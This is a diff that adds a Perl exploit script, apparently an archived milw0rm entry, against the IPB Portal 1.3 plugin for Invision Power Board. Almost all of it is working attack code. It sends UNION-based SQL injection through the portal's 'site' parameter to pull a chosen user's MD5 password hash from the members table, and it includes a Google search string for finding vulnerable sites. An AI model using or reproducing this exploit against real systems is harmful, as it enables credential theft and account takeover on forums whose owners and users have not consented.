@@ -1,0 +1,65 @@
+#!/usr/bin/perl
+###########################################
+#IPB Portal 1.3->Invision Power Board plugin
+#Created By SkOd
+#SED security Team , http://sed-team.be
+###########################################
+#google:
+#"Portal 1.3 by Dragoran"
+###########################################
+
+
+
+use IO::Socket;
+if (@ARGV < 3){
+print q{
+############################################################
+#      IPB Portal 1.3 SQL injection Get Hash Exploit       #
+#          Tested on Invision Power Board 1.3.0		   #
+#	    created By SkOd. SED Security Team             #
+############################################################
+	ipbpro.pl [HOST] [PATH] [Target id]
+	  ipbpro.pl www.host.com /forum/ 2 
+############################################################
+};
+exit;
+}
+$serv = $ARGV[0];
+$dir = $ARGV[1];
+$id = $ARGV[2];
+
+
+$serv =~ s/(http:\/\/)//eg;
+$path = $dir.'index.php?act=portal&site=-999%20UNION%20SELECT%20substring(password,1,10),substring(password,11,20),substring(password,21,30)%20FROM%20ibf_members%20Where%20id='.$id.'/*';
+$path2 = $dir.'index.php?act=portal&site=-999%20UNION%20SELECT%20substring(password,31,32),null,null%20FROM%20ibf_members%20Where%20id='.$id.'/*';
+$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$serv", PeerPort => "80") || die "[-]Connect Failed\r\n";
+
+print "[+]Connecting...\n";
+print $socket "GET $path HTTP/1.1\n";
+print $socket "Host: $serv\n";
+print $socket "Accept: */*\n";
+print $socket "Connection: close\n\n";
+print "[+]Connected\n";
+print "[+]User ID: $id\n";
+print "[+]MD5 Hash: ";
+while ($answer = <$socket>)
+{
+$answer =~ s/40%//eg;
+$answer =~ s/30%//eg;
+$answer =~ m/valign="top" width="(.*?)"/ && print "$1";
+}
+
+$socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$serv", PeerPort => "80") || die "[-]Exploit Failed\r\n";
+print $socket "GET $path2 HTTP/1.1\n";
+print $socket "Host: $serv\n";
+print $socket "Accept: */*\n";
+print $socket "Connection: close\n\n";
+
+while ($answer = <$socket>)
+{
+$answer =~ s/40%//eg;
+$answer =~ s/30%//eg;
+$answer =~ m/valign="top" width="(.*?)"/ && print "$1";
+}
+
+# milw0rm.com [2006-01-31]
